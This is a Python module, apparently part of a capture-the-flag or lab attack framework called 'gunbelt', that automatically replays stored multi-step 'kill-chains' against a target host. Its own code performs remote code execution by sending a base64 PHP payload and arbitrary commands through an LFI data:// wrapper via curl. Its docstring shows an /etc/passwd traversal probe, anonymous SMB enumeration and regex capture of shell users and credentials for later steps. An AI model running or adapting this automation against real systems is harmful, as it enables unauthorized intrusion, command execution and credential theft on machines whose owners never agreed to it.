#!/usr/bin/env python3
"""gunbelt CLOSER SPEC — the deterministic engine that RUNS a frozen closer.

A "closer" is a kill-chain that has been proven once and then FROZEN into data: an
ordered list of steps, each a real command template plus a verify predicate (the proof
that the step actually worked). No LLM is in this loop — a frozen closer fires the same
commands every time, fast and guardrail-safe. The closer_forge builds these specs by
iterating attacks against a live box until each step lands; this module replays them.

Spec shape (JSON, see closers/*.json):
{
  "name": "wordpress",
  "detect": {"cmd": "curl -s http://<<http>>/", "match": "wp-content|wordpress"},
  "steps": [
    {"id": "foothold",
     "rce_probe": {"cmd":"curl ...page=..../etc/passwd", "match":"root:x:0:0:"},  # optional
     "rce": "id",                     # run this ON the target via the data:// wrapper
     "run": "smbclient -N -L //<<smb>>",   # OR run this raw command (EXEC_SSH aware)
     "verify": "uid=\\d+\\(",         # step counts as a WIN only if this regex matches output
     "capture": {"shell": "uid=\\d+\\(([\\w.-]+)\\)"},   # named groups -> params for later steps
     "facts": ["shell=<<shell>>"],    # facts to emit (templated), autocannon vocabulary
     "gives": "shell",
     "required": true}                # a failed required step = closer did not close
  ]
}

Templating uses <<name>> (NOT {name}) so it never collides with shell/php braces.
Params start as the discovered service hosts (ftp/dns/smb/http) + <<target>>, and grow
as steps capture more (db_ip, dc_ip, cred_user, cred_pass, ...).

Contract mirrors trooper/recipes:  SpecRunner(target, spec).run() -> autocannon verdict.
"""
import base64, json, os, re, shlex, subprocess, threading

# reuse the proven primitives so a spec and a hand recipe fire commands identically
from recipes import sh, PHP_SYS, FLAG_RE, Recipes

CLOSERS_DIR = os.environ.get("GB_CLOSERS_DIR",
                             os.path.join(os.path.dirname(__file__), "closers"))
_PARAM = re.compile(r"<<(\w+)>>")


def render(tmpl, params):
    """Substitute <<name>> from params; leave unknown placeholders intact."""
    return _PARAM.sub(lambda m: str(params.get(m.group(1), m.group(0))), tmpl or "")


def load_spec(name_or_path):
    p = name_or_path
    if not os.path.exists(p):
        p = os.path.join(CLOSERS_DIR, name_or_path)
        if not p.endswith(".json"):
            p += ".json"
    with open(p) as f:
        return json.load(f)


def list_specs():
    if not os.path.isdir(CLOSERS_DIR):
        return []
    return sorted(f[:-5] for f in os.listdir(CLOSERS_DIR)
                  if f.endswith(".json") and not f.endswith(".draft.json"))


class SpecRunner:
    def __init__(self, target, spec, discover=True):
        self.target = target
        self.spec = spec
        self.p = {"target": target}
        self.cmds = []
        self.out = ""
        # seed params with the hosts recon actually finds (reuse the proven nmap sweep)
        if discover:
            try:
                rx = Recipes(target); rx.discover()
                for svc, ip in rx.bind.items():
                    self.p[svc] = ip
            except Exception:
                pass
        self.p.setdefault("http", target)

    # run a command ON the target through the data:// wrapper (LFI->RCE boxes)
    def _rce(self, command, timeout=30):
        web = self.p.get("http", self.target)
        c = (f"curl -s --max-time {timeout-2} -G http://{web}/index.php "
             f"--data-urlencode 'page=data://text/plain;base64,{PHP_SYS}' "
             f"--data-urlencode c={shlex.quote(command)}")
        return sh(c, timeout)

    def detect(self):
        d = self.spec.get("detect")
        if not d:
            return True
        r = sh(render(d["cmd"], self.p), 12)
        self.out += r
        return bool(re.search(d.get("match", "."), r, re.I))

    def _run_step(self, step):
        # probe first (e.g. confirm LFI before trying RCE); a failed probe skips the step
        probe = step.get("rce_probe")
        if probe:
            pr = sh(render(probe["cmd"], self.p), 12); self.out += pr
            self.cmds.append(render(probe["cmd"], self.p))
            if not re.search(probe.get("match", "."), pr, re.I):
                return False, "probe failed", []
        # execute
        if "rce" in step:
            cmd = render(step["rce"], self.p)
            r = self._rce(cmd); self.cmds.append(f"<rce> {cmd}")
        else:
            cmd = render(step["run"], self.p)
            r = sh(cmd, step.get("timeout", 30)); self.cmds.append(cmd)
        self.out += "\n$ " + cmd + "\n" + r
        # capture named groups into params for downstream steps
        for name, rx in (step.get("capture") or {}).items():
            m = re.search(rx, r)
            if m:
                self.p[name] = m.group(1) if m.groups() else m.group(0)
        # facts (templated) + any flags seen anywhere
        facts = [render(f, self.p) for f in (step.get("facts") or [])]
        for fl in FLAG_RE.findall(r):
            f = f"flag={fl}"
            if f not in facts:
                facts.append(f)
        # verdict for this step
        ver = step.get("verify")
        ok = True if not ver else bool(re.search(ver, r, re.S))
        return ok, (step.get("id", "") + (" ok" if ok else " miss")), facts

    def run(self):
        allf, results = [], []
        if not self.detect():
            return {"success": False, "evidence": "detect: not this shape", "facts": [],
                    "output": self.out[:8000], "cmds": self.cmds, "id": self.spec.get("name")}
        closed = True
        for step in self.spec.get("steps", []):
            ok, why, facts = self._run_step(step)
            results.append({"id": step.get("id"), "ok": ok, "why": why})
            for f in facts:
                if f not in allf:
                    allf.append(f)
            if step.get("required") and not ok:
                closed = False
        ev = f"{self.spec.get('name')} closer: " + ", ".join(
            f["id"] + ("" if f["ok"] else "!") for f in results)
        return {"success": closed, "evidence": ev[:200], "facts": allf,
                "output": self.out[:8000], "cmds": self.cmds, "id": self.spec.get("name"),
                "steps": results}


if __name__ == "__main__":
    import argparse, time
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--spec", required=True, help="closer name or path to .json")
    ap.add_argument("--no-discover", action="store_true")
    a = ap.parse_args()
    spec = load_spec(a.spec)
    t0 = time.time()
    v = SpecRunner(a.target, spec, discover=not a.no_discover).run()
    v["secs"] = round(time.time() - t0, 1)
    print(json.dumps(v, indent=2))
